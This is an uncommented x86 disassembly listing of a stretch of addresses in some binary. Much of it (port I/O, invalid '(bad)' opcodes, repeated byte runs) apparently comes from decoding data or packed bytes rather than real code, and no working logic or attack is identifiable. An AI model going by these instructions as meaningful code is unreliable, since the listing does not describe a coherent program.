  40e739:	add    BYTE PTR [ebx-0x34],al
  40e73c:	inc    eax
  40e73d:	add    eax,0x78434040
  40e742:	bound  eax,QWORD PTR [ecx+0x78]
  40e745:	add    eax,0x62404043
  40e74a:	test   BYTE PTR [ecx+0x2],0x84
  40e74e:	in     al,dx
  40e74f:	or     al,0xa8
  40e751:	ins    BYTE PTR es:[edi],dx
  40e752:	xchg   ecx,esp
  40e754:	and    eax,0x12636238
  40e759:	push   eax
  40e75a:	dec    ebx
  40e75b:	dec    edx
  40e75c:	ror    DWORD PTR [esi],1
  40e75e:	test   al,0x21
  40e760:	dec    eax
  40e761:	inc    ebx
  40e762:	inc    edi
  40e763:	mov    ds:0x7c656204,eax
  40e768:	inc    ecx
  40e769:	lds    edx,FWORD PTR [edx]
  40e76b:	dec    esp
  40e76c:	adc    eax,DWORD PTR [ecx+0x40]
  40e76f:	add    eax,0x43436240
  40e774:	add    eax,0x62004040
  40e779:	inc    eax
  40e77a:	add    BYTE PTR [ecx+0x40],al
  40e77d:	inc    ebx
  40e77e:	test   BYTE PTR ds:0x58054041,ah
  40e784:	inc    eax
  40e785:	inc    eax
  40e786:	bound  eax,QWORD PTR [eax+0x66]
  40e789:	inc    ecx
  40e78a:	inc    eax
  40e78b:	add    eax,0x62320500
  40e790:	and    BYTE PTR [edx+0x753ae16c],ah
  40e796:	imul   eax,DWORD PTR [eax+0x20],0x2d
  40e79a:	xchg   ebx,eax
  40e79b:	add    esi,DWORD PTR [ecx-0x5b]
  40e79e:	clc    
  40e79f:	push   eax
  40e7a0:	and    BYTE PTR fs:[edi+0x636300a1],ah
  40e7a7:	aaa    
  40e7a8:	bound  ebx,QWORD PTR [edx]
  40e7aa:	cmp    eax,0x199422af
  40e7af:	push   esi
  40e7b0:	fs sub cl,dl
  40e7b3:	inc    ebx
  40e7b4:	out    dx,eax
  40e7b5:	inc    eax
  40e7b6:	fsub   DWORD PTR [edi+0x62]
  40e7b9:	adc    al,0xd
  40e7bb:	jecxz  0x40e7be
  40e7bd:	bound  edx,QWORD PTR fs:[eax]
  40e7c0:	push   edi
  40e7c1:	inc    ebx
  40e7c2:	ret    
  40e7c3:	add    BYTE PTR [eax],al
  40e7c5:	inc    ebx
  40e7c6:	inc    eax
  40e7c7:	bound  eax,QWORD PTR ds:0x25404110
  40e7cd:	add    ah,cl
  40e7cf:	inc    ebx
  40e7d0:	add    eax,0x40402562
  40e7d5:	add    BYTE PTR [eax+0x40],al
  40e7d8:	inc    ecx
  40e7d9:	inc    ecx
  40e7da:	add    eax,0x78434025
  40e7df:	bound  eax,QWORD PTR [eax-0x7c]
  40e7e2:	inc    eax
  40e7e3:	inc    ecx
  40e7e4:	jno    0x40e82b
  40e7e6:	xchg   DWORD PTR [edx-0x1f],eax
  40e7e9:	nop
  40e7ea:	inc    eax
  40e7eb:	test   al,0x23
  40e7ed:	adc    DWORD PTR [eax+0x1b],0x72245bf9
  40e7f4:	dec    esp
  40e7f5:	push   ds
  40e7f6:	leave  
  40e7f7:	test   eax,0xf66c8852
  40e7fc:	in     eax,0x4
  40e7fe:	push   ecx
  40e7ff:	mov    eax,0xcb6af5c3
  40e804:	push   eax
  40e805:	sub    al,0xcb
  40e807:	inc    ecx
  40e808:	dec    esp
  40e809:	inc    ecx
  40e80a:	inc    eax
  40e80b:	inc    eax
  40e80c:	inc    ebx
  40e80d:	int3   
  40e80e:	add    BYTE PTR ds:0x56240,al
  40e814:	inc    ebx
  40e815:	inc    eax
  40e816:	inc    eax
  40e817:	add    BYTE PTR [ecx+0x62],al
  40e81a:	bound  eax,QWORD PTR [eax]
  40e81c:	int3   
  40e81d:	inc    eax
  40e81e:	inc    ebx
  40e81f:	add    eax,0x43624041
  40e824:	adc    BYTE PTR [ecx+0x5],al
  40e827:	inc    eax
  40e828:	and    al,0x46
  40e82a:	cmp    al,0xa1
  40e82c:	inc    ebp
  40e82d:	inc    edx
  40e82e:	push   esi
  40e82f:	or     eax,0x11c1cda9
  40e834:	add    BYTE PTR ds:0x98b853a8,ah
  40e83a:	sub    DWORD PTR [ebp-0x4a],esp
  40e83d:	clc    
  40e83e:	jg     0x40e7f8
  40e840:	pop    ebp
  40e841:	xchg   ebx,eax
  40e842:	in     al,dx
  40e843:	dec    ecx
  40e844:	cli    
  40e845:	bound  ebx,QWORD PTR [eax*1+0x610fdf7e]
  40e84c:	xor    ah,bh
  40e84e:	arpl   WORD PTR [ebx+0x68],ax
  40e851:	dec    ecx
  40e852:	sub    al,BYTE PTR [ebx+0x1]
  40e855:	loopne 0x40e85f
  40e857:	pusha  
  40e858:	jae    0x40e882
  40e85a:	mov    ecx,0x7462fee0
  40e85f:	bound  eax,QWORD PTR [ebx+0x40]
  40e862:	adc    BYTE PTR ds:0x4158cc40,al
  40e868:	inc    ebx
  40e869:	bound  eax,QWORD PTR [ecx+0x40]
  40e86c:	add    eax,0x4140
  40e871:	and    eax,0x40400062
  40e876:	add    eax,0x84404340
  40e87b:	int3   
  40e87c:	js     0x40e87e
  40e87e:	inc    ecx
  40e87f:	adc    BYTE PTR [edx+0xf],ah
  40e882:	xlat   BYTE PTR ds:[ebx]
  40e883:	cmp    al,0x10
  40e885:	push   ebx
  40e886:	sub    DWORD PTR [ecx],eax
  40e888:	inc    esp
  40e889:	arpl   WORD PTR [edx+ebx*4+0x43],dx
  40e88d:	adc    bh,BYTE PTR [esi-0x4b3f57a7]
  40e893:	xchg   esp,eax
  40e894:	inc    eax
  40e895:	mov    ebx,0x783d034c
  40e89a:	test   al,0x50
  40e89c:	and    al,0xd4
  40e89e:	add    BYTE PTR [eax+0x41],al
  40e8a1:	inc    eax
  40e8a2:	inc    ebx
  40e8a3:	bound  ax,DWORD PTR ds:0x40434100
  40e8aa:	add    eax,0x40054062
  40e8af:	bound  eax,QWORD PTR [ecx+0x40]
  40e8b2:	inc    ebx
  40e8b3:	inc    eax
  40e8b4:	add    eax,0x25405841
  40e8b9:	bound  eax,QWORD PTR [eax+0x43]
  40e8bc:	inc    eax
  40e8bd:	adc    BYTE PTR [ecx+0x12bdc382],ah
  40e8c3:	push   edi
  40e8c4:	ins    BYTE PTR es:[edi],dx
  40e8c5:	mov    es,ebp
  40e8c7:	and    DWORD PTR [ebx+0x63],0xf604dd8c
  40e8ce:	in     eax,0xff
  40e8d0:	inc    edx
  40e8d1:	fs adc eax,0x49506a43
  40e8d7:	add    ebx,DWORD PTR [ebp+0x30]
  40e8da:	int    0x60
  40e8dc:	in     eax,0x92
  40e8de:	mov    eax,ds:0x54b0244a
  40e8e3:	addr16 sub eax,0x5801d3a0
  40e8e9:	add    eax,0x946cfe35
  40e8ee:	mov    eax,ds:0x40cbc83d
  40e8f3:	inc    ecx
  40e8f4:	inc    ebx
  40e8f5:	inc    eax
  40e8f6:	add    eax,0x43406262
  40e8fb:	inc    ecx
  40e8fc:	adc    BYTE PTR [eax],al
  40e8fe:	inc    eax
  40e8ff:	add    eax,0x43000562
  40e904:	add    BYTE PTR [ecx+0x40],al
  40e907:	inc    eax
  40e908:	add    eax,0x400062
  40e90d:	inc    ebx
  40e90e:	inc    eax
  40e90f:	js     0x40e952
  40e911:	inc    ecx
  40e912:	bound  eax,QWORD PTR [eax+0x45]
  40e915:	enter  0x15b,0x6b
  40e919:	add    cl,BYTE PTR [eax+edx*2-0x1]
  40e91d:	fld    TBYTE PTR [eax]
  40e91f:	in     eax,0x25
  40e921:	and    ch,BYTE PTR [eax+0xc2c48cf]
  40e927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e928:	cmp    BYTE PTR [esi-0x2ad3eee],bh
  40e92e:	inc    edx
  40e92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e930:	and    al,0x94
  40e932:	mov    eax,0x40b082fa
  40e937:	xchg   edi,eax
  40e938:	and    al,0x83
  40e93a:	inc    ecx
  40e93b:	test   al,0x88
  40e93d:	pop    ecx
  40e93e:	and    al,0x8
  40e940:	inc    edx
  40e941:	call   FWORD PTR [ecx+0x6c821b11]
  40e947:	mov    ecx,fs
  40e949:	sub    DWORD PTR [eax],0x41
  40e94c:	and    BYTE PTR [edx+0x40],0x5
  40e950:	inc    ecx
  40e951:	add    BYTE PTR [ebx+0x40],al
  40e954:	inc    eax
  40e955:	inc    ecx
  40e956:	inc    eax
  40e957:	inc    eax
  40e958:	bound  eax,QWORD PTR ds:0x5624300
  40e95e:	add    BYTE PTR [eax+0x40],al
  40e961:	add    BYTE PTR [ecx+0x43],al
  40e964:	add    BYTE PTR [eax+0x41],al
  40e967:	add    eax,0x40436200
  40e96c:	inc    eax
  40e96d:	add    eax,0xbe1e2862
  40e972:	mov    ebp,0xaa7f621a
  40e977:	leave  
  40e978:	inc    ebx
  40e979:	test   DWORD PTR [ecx+0x3],0x5946a465
  40e980:	(bad)
  40e983:	dec    edx
  40e984:	test   BYTE PTR [edx-0x37],ah
  40e987:	and    dh,BYTE PTR [edi+0x62814418]
  40e98d:	outs   dx,BYTE PTR ds:[esi]
  40e98e:	test   al,0xb0
  40e990:	xor    eax,0x43cea256
  40e995:	fadd   QWORD PTR [esi+0x15]
  40e998:	mov    ebx,0xe4813394
  40e99d:	mov    al,0xa9
  40e99f:	pop    edx
  40e9a0:	xchg   DWORD PTR [ecx+0x40],eax
  40e9a3:	add    eax,0x41624340
  40e9a8:	test   BYTE PTR [eax],al
  40e9aa:	and    eax,0x404043
  40e9af:	add    BYTE PTR ds:0x626210,al
  40e9b5:	add    eax,0x43404140
  40e9ba:	inc    eax
  40e9bb:	inc    ecx
  40e9bc:	add    eax,0x10664062
  40e9c1:	inc    ebx
  40e9c2:	bound  eax,QWORD PTR [esi+0x126f1c4c]
  40e9c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9c9:	mov    dh,0x28
  40e9cb:	lds    esp,FWORD PTR [ecx-0xfd29eff]
  40e9d1:	inc    edi
  40e9d2:	or     BYTE PTR [edx-0x33fa7e8d],dh
  40e9d8:	inc    ecx
  40e9d9:	inc    eax
  40e9da:	add    BYTE PTR [eax],al
  40e9dc:	add    BYTE PTR [eax+0x40],al
  40e9df:	inc    ebx
  40e9e0:	bound  eax,QWORD PTR [eax]
  40e9e2:	inc    eax
  40e9e3:	inc    eax
  40e9e4:	add    eax,0x62434162
  40e9e9:	inc    eax
  40e9ea:	js     0x40e9fc
  40e9ec:	inc    ecx
  40e9ed:	add    eax,0x5404325
  40e9f2:	bound  eax,QWORD PTR [eax+0x40]
  40e9f5:	inc    ecx
  40e9f6:	inc    ebx
  40e9f7:	mov    WORD PTR [edx-0xf],fs
  40e9fa:	sbb    al,BYTE PTR [ebx+0x7f]
  40e9fd:	popa   
  40e9fe:	or     DWORD PTR ds:0x40ad560a,ebx
  40ea04:	mov    BYTE PTR [ecx+0x49],0x5d
  40ea08:	sub    al,0xa4
  40ea0a:	arpl   WORD PTR [ecx+eax*1],sp
  40ea0d:	mov    eax,ds:0xd622501
  40ea12:	mov    eax,0xbf61bd6c
  40ea17:	lods   eax,DWORD PTR ds:[esi]
  40ea18:	sbb    DWORD PTR [esi+edi*2+0x38],ebp
  40ea1c:	and    al,0x61
  40ea1e:	push   ds
  40ea1f:	shl    BYTE PTR [ebp+eiz*1+0x436241],0x10
  40ea27:	inc    eax
  40ea28:	add    BYTE PTR ds:0x62410040,al
  40ea2e:	inc    eax
  40ea2f:	add    BYTE PTR [ebx-0x34],al
  40ea32:	inc    eax
  40ea33:	add    eax,0x78434040
  40ea38:	bound  eax,QWORD PTR [ecx+0x78]
  40ea3b:	add    eax,0x62404043
  40ea40:	sub    bh,BYTE PTR ds:0x12765e43
  40ea46:	arpl   WORD PTR [edx+0x64],sp
  40ea49:	or     eax,ebp
  40ea4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea4c:	and    eax,0xf940aa29
  40ea51:	cmp    al,dl
  40ea53:	mov    ebx,0xb4a8149f
  40ea58:	mov    ds:0x679842c8,al
  40ea5d:	add    DWORD PTR [edx+0x3d],0x29114864
  40ea64:	popa   
  40ea65:	inc    ebx
  40ea66:	sub    al,bl
  40ea68:	mov    dh,0x21
  40ea6a:	aaa    
  40ea6b:	mov    al,ds:0x40054041
  40ea70:	bound  eax,QWORD PTR [ebx+0x43]
  40ea73:	add    eax,0x62004040
  40ea78:	inc    eax
  40ea79:	add    BYTE PTR [ecx+0x40],al
  40ea7c:	inc    ebx
  40ea7d:	test   BYTE PTR ds:0x58054041,ah
  40ea83:	inc    eax
  40ea84:	inc    eax
  40ea85:	bound  eax,QWORD PTR [eax+0x66]
  40ea88:	inc    ecx
  40ea89:	inc    eax
  40ea8a:	add    eax,0x11806100
  40ea8f:	mov    ah,0x66
  40ea91:	pop    esp
  40ea92:	sub    BYTE PTR [ebx+0x5b401e1],cl
  40ea98:	mov    al,ds:0x460e04eb
  40ea9d:	inc    eax
  40ea9e:	inc    ebx
  40ea9f:	leave  
  40eaa0:	adc    eax,0xa1ce43b1
  40eaa5:	add    BYTE PTR [eax],al
  40eaa7:	inc    ebx
  40eaa8:	inc    eax
  40eaa9:	bound  eax,QWORD PTR ds:0x25404110
  40eaaf:	add    ah,cl
  40eab1:	inc    ebx
  40eab2:	add    eax,0x40402562
  40eab7:	add    BYTE PTR [eax+0x40],al
  40eaba:	inc    ecx
  40eabb:	inc    ecx
  40eabc:	add    eax,0x78434025
  40eac1:	bound  eax,QWORD PTR [eax-0x7c]
  40eac4:	inc    eax
  40eac5:	inc    ecx
  40eac6:	pusha  
  40eac7:	pop    ebp
  40eac8:	xchg   ecx,eax
  40eac9:	inc    edi
  40eaca:	arpl   WORD PTR [eax+0x18],ax
  40eacd:	pop    edx
  40eace:	sbb    eax,0x79ce45e4
  40ead3:	and    al,0xa6
  40ead5:	loop   0x40eada
  40ead7:	sub    BYTE PTR [esi+0x15],al
  40eada:	jo     0x40eb48
  40eadc:	or     DWORD PTR [edi],ebp
  40eade:	icebp  
  40eadf:	cmp    ebx,eax
  40eae1:	cli    
  40eae2:	arpl   dx,dx
  40eae4:	lods   eax,DWORD PTR ds:[esi]
  40eae5:	dec    edx
  40eae6:	adc    eax,0x439cc821
  40eaeb:	inc    ebx
  40eaec:	push   ds
  40eaed:	mov    eax,ds:0x40414700
  40eaf2:	inc    eax
  40eaf3:	inc    ebx
  40eaf4:	int3   
  40eaf5:	add    BYTE PTR ds:0x56240,al
  40eafb:	inc    ebx
  40eafc:	inc    eax
  40eafd:	inc    eax
  40eafe:	add    BYTE PTR [ecx+0x62],al
  40eb01:	bound  eax,QWORD PTR [eax]
  40eb03:	int3   
  40eb04:	inc    eax
  40eb05:	inc    ebx
  40eb06:	add    eax,0x43624041
  40eb0b:	adc    BYTE PTR [ecx+0x5],al
  40eb0e:	inc    eax
  40eb0f:	inc    esi
  40eb10:	dec    ecx
  40eb11:	in     al,dx
  40eb12:	(bad)
  40eb15:	and    esp,ecx
  40eb17:	cmp    edi,edx
  40eb19:	addr16 imul edx,eax,0xffffffe3
  40eb1d:	adc    eax,0x9c9a4568
  40eb22:	mov    eax,ds:0xd783c534
  40eb27:	sbb    DWORD PTR [ecx+0x15],ecx
  40eb2a:	pop    ebp
  40eb2b:	pop    ss
  40eb2c:	and    esi,ebp
  40eb2e:	inc    ebx
  40eb2f:	mov    eax,ds:0x9b5cc9b5
  40eb34:	mov    bh,0x2
  40eb36:	in     eax,0x62
  40eb38:	cwde   
  40eb39:	lods   al,BYTE PTR ds:[esi]
  40eb3a:	sub    BYTE PTR [edx+0x51],ch
  40eb3d:	adc    eax,0x15662168
  40eb42:	add    BYTE PTR [edx+0x10404362],ch
  40eb48:	add    eax,0x4158cc40
  40eb4d:	inc    ebx
  40eb4e:	bound  eax,QWORD PTR [ecx+0x40]
  40eb51:	add    eax,0x4140
  40eb56:	and    eax,0x40400062
  40eb5b:	add    eax,0x84404340
  40eb60:	int3   
  40eb61:	js     0x40eb63
  40eb63:	inc    ecx
  40eb64:	adc    BYTE PTR [edx+0xf],ah
  40eb67:	mov    eax,ds:0x79c85040
  40eb6c:	inc    edx
  40eb6d:	inc    ebx
  40eb6e:	jae    0x40eba8
  40eb70:	pusha  
  40eb71:	test   al,0x62
  40eb73:	pop    si
  40eb75:	inc    eax
  40eb76:	push   cs
  40eb77:	mov    eax,ds:0x96b812c9
  40eb7c:	enter  0xc924,0x36
  40eb80:	push   cs
  40eb81:	dec    eax
  40eb82:	adc    eax,0x406ca00d
  40eb87:	loope  0x40eb7a
  40eb89:	inc    ecx
  40eb8a:	int    0xe9
  40eb8c:	pusha  
  40eb8d:	in     al,dx
  40eb8e:	inc    eax
  40eb8f:	push   esp
  40eb90:	(bad)  
  40eb91:	jmp    0x40ebed
  40eb93:	cmp    ah,BYTE PTR [ecx+0x48234043]
  40eb99:	add    BYTE PTR [eax+0x41],al
  40eb9c:	inc    eax
  40eb9d:	inc    ebx
  40eb9e:	bound  ax,DWORD PTR ds:0x40434100
  40eba5:	add    eax,0x40054062
  40ebaa:	bound  eax,QWORD PTR [ecx+0x40]
  40ebad:	inc    ebx
  40ebae:	inc    eax
  40ebaf:	add    eax,0x25405841
  40ebb4:	bound  eax,QWORD PTR [eax+0x43]
  40ebb7:	inc    eax
  40ebb8:	adc    BYTE PTR [eax-0x3a9aabbf],al
  40ebbe:	add    al,0x56
  40ebc0:	test   DWORD PTR [edx+0x13],esp
  40ebc3:	stc    
  40ebc4:	pop    esi
  40ebc5:	aaa    
  40ebc6:	inc    eax
  40ebc7:	fs dec ecx
  40ebc9:	data16 js 0x40eb60
  40ebcc:	call   0x742cb8
  40ebd1:	mov    esp,0x9a94e662
  40ebd6:	inc    eax
  40ebd7:	sub    BYTE PTR gs:[eax+ecx*2+0x16],ah
  40ebdc:	add    eax,0x4b210ca5
  40ebe1:	(bad)  
  40ebe2:	enter  0x8756,0x28
  40ebe6:	inc    eax
  40ebe7:	dec    edx
  40ebe8:	add    BYTE PTR [ebx+ecx*1+0x41406592],al
  40ebef:	inc    ebx
  40ebf0:	inc    eax
  40ebf1:	add    eax,0x43406262
  40ebf6:	inc    ecx
  40ebf7:	adc    BYTE PTR [eax],al
  40ebf9:	inc    eax
  40ebfa:	add    eax,0x43000562
  40ebff:	add    BYTE PTR [ecx+0x40],al
  40ec02:	inc    eax
  40ec03:	add    eax,0x400062
  40ec08:	inc    ebx
  40ec09:	inc    eax
  40ec0a:	js     0x40ec4d
  40ec0c:	inc    ecx
  40ec0d:	bound  eax,QWORD PTR [eax+0x7c]
  40ec10:	adc    ah,BYTE PTR [esp+0x5c]
  40ec14:	sbb    eax,0x40436f15
  40ec19:	mov    ebx,0x66718827
  40ec1e:	bound  eax,QWORD PTR [eax+0x15]
  40ec21:	adc    BYTE PTR [edx-0x773d9c25],al
  40ec27:	and    al,0x40
  40ec29:	and    ch,BYTE PTR [ebp+0x18]
  40ec2c:	add    eax,0x6e6cf664
  40ec31:	and    ebp,DWORD PTR [edx]
  40ec33:	(bad)  
  40ec34:	fdivr  st,st(2)
  40ec36:	dec    edi
  40ec37:	bound  eax,QWORD PTR [eax+0x5]
  40ec3a:	inc    ecx
  40ec3b:	add    BYTE PTR [ebx+0x40],al
  40ec3e:	inc    eax
  40ec3f:	inc    ecx
  40ec40:	inc    eax
  40ec41:	inc    eax
  40ec42:	bound  eax,QWORD PTR ds:0x5624300
  40ec48:	add    BYTE PTR [eax+0x40],al
  40ec4b:	add    BYTE PTR [ecx+0x43],al
  40ec4e:	add    BYTE PTR [eax+0x41],al
  40ec51:	add    eax,0x40436200
  40ec56:	inc    eax
  40ec57:	add    eax,0x49408662
  40ec5c:	or     eax,0x909062a9
  40ec61:	inc    ebx
  40ec62:	push   cs
  40ec63:	mov    ds:0x496eac83,al
  40ec68:	inc    ecx
  40ec69:	lds    eax,FWORD PTR [eax+0x23]
  40ec6c:	dec    esi
  40ec6d:	dec    esi
  40ec6e:	xor    eax,0xfdfe8f6
  40ec73:	dec    edi
  40ec74:	add    bh,dl
  40ec76:	shl    BYTE PTR [ebx],0xd8
  40ec79:	add    eax,0x6722e040
  40ec7e:	inc    edi
  40ec7f:	stc    
  40ec80:	shr    BYTE PTR [eax+0x9],0x28
  40ec84:	inc    edi
  40ec85:	pop    ebp
  40ec86:	inc    eax
  40ec87:	mov    cs,WORD PTR [ebx+0x7d]
  40ec8a:	inc    eax
  40ec8b:	je     0x40ec0f
  40ec8d:	fmul   QWORD PTR [esi+0x41]
  40ec90:	inc    eax
  40ec91:	add    eax,0x41624340
  40ec96:	test   BYTE PTR [eax],al
  40ec98:	and    eax,0x404043
  40ec9d:	add    BYTE PTR ds:0x626210,al
  40eca3:	add    eax,0x43404140
  40eca8:	inc    eax
  40eca9:	inc    ecx
  40ecaa:	add    eax,0x10664062
  40ecaf:	inc    ebx
  40ecb0:	bound  edx,QWORD PTR [ebx]
  40ecb2:	sub    eax,0x386a1428
  40ecb7:	fs mov ah,0x17
  40ecba:	sbb    eax,0xcf274078
  40ecbf:	cld    
  40ecc0:	cmp    eax,0x343a865
  40ecc5:	sub    al,BYTE PTR [eax]
  40ecc7:	arpl   cx,ax
  40ecc9:	add    eax,0x4041cc
  40ecce:	add    BYTE PTR [eax],al
  40ecd0:	inc    eax
  40ecd1:	inc    eax
  40ecd2:	inc    ebx
  40ecd3:	bound  eax,QWORD PTR [eax]
  40ecd5:	inc    eax
  40ecd6:	inc    eax
  40ecd7:	add    eax,0x62434162
  40ecdc:	inc    eax
  40ecdd:	js     0x40ecef
  40ecdf:	inc    ecx
  40ece0:	add    eax,0x5404325
  40ece5:	bound  eax,QWORD PTR [eax+0x40]
  40ece8:	inc    ecx
  40ece9:	inc    ebx
  40ecea:	clc    
  40eceb:	adc    al,BYTE PTR [eax+0x40]
  40ecee:	dec    ecx
  40ecef:	jae    0x40ed34
  40ecf1:	mov    ah,0x8c
  40ecf3:	dec    eax
  40ecf4:	and    al,0x15
  40ecf6:	mov    eax,ds:0x1505fc40
  40ecfb:	inc    ecx
  40ecfc:	ins    BYTE PTR es:[edi],dx
  40ecfd:	inc    eax
  40ecfe:	jo     0x40ec94
  40ed00:	js     0x40eccb
  40ed02:	jmp    0x40ed6b
  40ed04:	mov    al,ds:0x4171e212
  40ed09:	dec    ecx
  40ed0a:	inc    edi
  40ed0b:	adc    al,0x43
  40ed0d:	inc    eax
  40ed0e:	test   eax,0x4125ac40
  40ed13:	bound  eax,QWORD PTR [ebx+0x0]
  40ed16:	adc    BYTE PTR [eax+0x0],al
  40ed19:	add    eax,0x62410040
  40ed1e:	inc    eax
  40ed1f:	add    BYTE PTR [ebx-0x34],al
  40ed22:	inc    eax
  40ed23:	add    eax,0x78434040
  40ed28:	bound  eax,QWORD PTR [ecx+0x78]
  40ed2b:	add    eax,0x62404043
  40ed30:	sbb    DWORD PTR [esp+eiz*2-0x3b],edx
  40ed34:	adc    al,0x4f
  40ed36:	jp     0x40ed8f
  40ed38:	mov    al,ds:0x40e749fa
  40ed3d:	or     BYTE PTR [eax+eax*4+0x62],0x88
  40ed42:	in     al,dx
  40ed43:	ret    
  40ed44:	adc    edx,DWORD PTR [ecx]
  40ed46:	cmp    BYTE PTR [ecx+0x42],0x63
  40ed4a:	imul   ecx,ecx,0x40418240
  40ed50:	add    eax,0x43436240
  40ed55:	add    eax,0x62004040
  40ed5a:	inc    eax
  40ed5b:	add    BYTE PTR [ecx+0x40],al
  40ed5e:	inc    ebx
  40ed5f:	test   BYTE PTR ds:0x58054041,ah
  40ed65:	inc    eax
  40ed66:	inc    eax
  40ed67:	bound  eax,QWORD PTR [eax+0x66]
  40ed6a:	inc    ecx
  40ed6b:	inc    eax
  40ed6c:	add    eax,0xd4643a00
  40ed71:	push   ds
  40ed72:	dec    esp
  40ed73:	add    al,0xe
  40ed75:	or     eax,0x63d062ed
  40ed7a:	int    0x28
  40ed7c:	inc    eax
  40ed7d:	fild   DWORD PTR [edx]
  40ed7f:	sub    BYTE PTR [ecx-0x7a],dl
  40ed82:	test   eax,0x6db10974
  40ed87:	pop    es
  40ed88:	xor    ecx,DWORD PTR [edx+0x63]
  40ed8b:	inc    ebx
  40ed8c:	inc    eax
  40ed8d:	stos   DWORD PTR es:[edi],eax
  40ed8e:	pop    edi
  40ed8f:	arpl   WORD PTR [ecx+eiz*4+0x8],di
  40ed93:	pop    ecx
  40ed94:	pop    ds
  40ed95:	test   BYTE PTR ds:0xa884a85d,al
  40ed9b:	pushf  
  40ed9c:	inc    eax
  40ed9d:	xchg   edi,eax
  40ed9e:	push   ebp
  40ed9f:	inc    BYTE PTR [eax+0x15]
  40eda2:	adc    BYTE PTR [ebp+0x0],bl
  40eda5:	add    BYTE PTR [ebx+0x40],al
  40eda8:	bound  eax,QWORD PTR ds:0x25404110
  40edae:	add    ah,cl
  40edb0:	inc    ebx
  40edb1:	add    eax,0x40402562
  40edb6:	add    BYTE PTR [eax+0x40],al
  40edb9:	inc    ecx
  40edba:	inc    ecx
  40edbb:	add    eax,0x78434025
  40edc0:	bound  eax,QWORD PTR [eax-0x7c]
  40edc3:	inc    eax
  40edc4:	inc    ecx
  40edc5:	adc    al,0xa1
  40edc7:	dec    edx
  40edc8:	inc    esp
  40edc9:	sub    ah,BYTE PTR [eax+0x48]
  40edcc:	in     al,0x40
  40edce:	(bad)  
  40edcf:	sbb    al,0x41
  40edd2:	into   
  40edd3:	inc    ecx
  40edd4:	mov    bl,0x10
  40edd6:	add    edi,DWORD PTR [ebx-0x21]
  40edd9:	add    bl,BYTE PTR [edx+eiz*1-0x46]
  40eddd:	inc    eax
  40edde:	or     al,0x40
  40ede0:	inc    ebx
  40ede1:	(bad)  
  40ede2:	cli    
  40ede3:	rol    BYTE PTR [ebx+0x19],1
  40ede6:	xchg   DWORD PTR [edi*8-0x399d7d9e],eax
  40eded:	inc    eax
  40edee:	fidiv  WORD PTR [eax+0x68]
  40edf1:	sbb    al,0x6a
  40edf3:	inc    eax
  40edf4:	pop    ss
  40edf5:	adc    cl,BYTE PTR [ecx+0x40419940]
  40edfb:	inc    eax
  40edfc:	inc    ebx
  40edfd:	int3   
  40edfe:	add    BYTE PTR ds:0x56240,al
  40ee04:	inc    ebx
  40ee05:	inc    eax
  40ee06:	inc    eax
  40ee07:	add    BYTE PTR [ecx+0x62],al
  40ee0a:	bound  eax,QWORD PTR [eax]
  40ee0c:	int3   
  40ee0d:	inc    eax
  40ee0e:	inc    ebx
  40ee0f:	add    eax,0x43624041
  40ee14:	adc    BYTE PTR [ecx+0x5],al
  40ee17:	inc    eax
  40ee18:	in     al,0x2
  40ee1a:	sub    dh,BYTE PTR [ecx+0x3640]
  40ee20:	bound  esp,QWORD PTR [esi+0x34]
  40ee23:	cmp    eax,DWORD PTR [ebx]
  40ee25:	cmp    DWORD PTR [eax+0x62],0x2b128039
  40ee2c:	inc    eax
  40ee2d:	inc    esi
  40ee2e:	inc    eax
  40ee2f:	test   al,0x34
  40ee31:	bound  ebp,QWORD PTR gs:[eax]
  40ee34:	add    eax,0xb8056382
  40ee39:	inc    ecx
  40ee3a:	inc    ebx
  40ee3b:	jo     0x40ee7d
  40ee3d:	sub    eax,0x6605cbe8
  40ee42:	cmp    al,0x43
  40ee44:	add    al,0x62
  40ee46:	inc    ebx
  40ee47:	inc    eax
  40ee48:	adc    BYTE PTR ds:0x4158cc40,al
  40ee4e:	inc    ebx
  40ee4f:	bound  eax,QWORD PTR [ecx+0x40]
  40ee52:	add    eax,0x4140
  40ee57:	and    eax,0x40400062
  40ee5c:	add    eax,0x84404340
  40ee61:	int3   
  40ee62:	js     0x40ee64
  40ee64:	inc    ecx
  40ee65:	adc    BYTE PTR [edx+0xf],ah
  40ee68:	add    DWORD PTR [eax+0x50],eax
  40ee6b:	xchg   esi,edi
  40ee6d:	outs   dx,DWORD PTR ds:[esi]
  40ee6e:	inc    eax
  40ee6f:	inc    eax
  40ee70:	add    bh,BYTE PTR [edx+0x15]
  40ee73:	cmp    esp,DWORD PTR [ebp+0x6c]
  40ee76:	and    al,0x40
  40ee78:	cmp    eax,0x4141cb51
  40ee7d:	pop    ebx
  40ee7e:	ins    BYTE PTR es:[edi],dx
  40ee7f:	inc    eax
  40ee80:	daa    
  40ee81:	add    BYTE PTR [eax+0x0],cl
  40ee84:	inc    eax
  40ee85:	inc    ecx
  40ee86:	inc    eax
  40ee87:	inc    ebx
  40ee88:	bound  ax,DWORD PTR ds:0x40434100
  40ee8f:	add    eax,0x40054062
  40ee94:	bound  eax,QWORD PTR [ecx+0x40]
  40ee97:	inc    ebx
  40ee98:	inc    eax
  40ee99:	add    eax,0x25405841
  40ee9e:	bound  eax,QWORD PTR [eax+0x43]
  40eea1:	inc    eax
  40eea2:	adc    BYTE PTR [edx],al
  40eea4:	data16 fst QWORD PTR [eax+eax*2+0x54]
  40eea9:	das    
  40eeaa:	leave  
  40eeab:	sar    ah,0x40
  40eeae:	inc    ebx
  40eeaf:	inc    eax
  40eeb0:	add    DWORD PTR [edx-0x54],ebp
  40eeb3:	or     ax,0xc5f8
  40eeb7:	or     al,0x37
  40eeb9:	add    al,BYTE PTR [esi+0x44]
  40eebc:	inc    ecx
  40eebd:	fwait
  40eebe:	xchg   ecx,eax
  40eebf:	inc    eax
  40eec0:	test   DWORD PTR [ebx],esp
  40eec2:	or     ch,BYTE PTR [edx+eax*8+0x40]
  40eec6:	inc    ecx
  40eec7:	inc    ebx
  40eec8:	inc    eax
  40eec9:	add    eax,0x43406262
  40eece:	inc    ecx
  40eecf:	adc    BYTE PTR [eax],al
  40eed1:	inc    eax
  40eed2:	add    eax,0x43000562
  40eed7:	add    BYTE PTR [ecx+0x40],al
  40eeda:	inc    eax
  40eedb:	add    eax,0x400062
  40eee0:	inc    ebx
  40eee1:	inc    eax
